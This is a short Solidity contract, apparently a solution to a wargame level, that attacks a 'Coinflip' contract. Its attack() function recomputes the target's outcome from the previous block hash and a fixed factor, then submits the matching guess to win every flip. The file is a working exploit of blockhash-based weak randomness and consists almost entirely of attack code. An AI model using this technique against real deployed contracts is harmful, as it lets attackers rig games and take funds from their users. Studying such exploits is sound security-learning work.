// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./Coinflip.sol";

interface ICoinflip {
    function flip(bool _guess) external returns (bool);
}

contract CoinflipAttack {
    ICoinflip public target; // vulnerable smart contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address targetAddress) {
        target = ICoinflip(targetAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side); // we only send the right guess to the original contract, netting us the 10 consecutive wins
    }
}
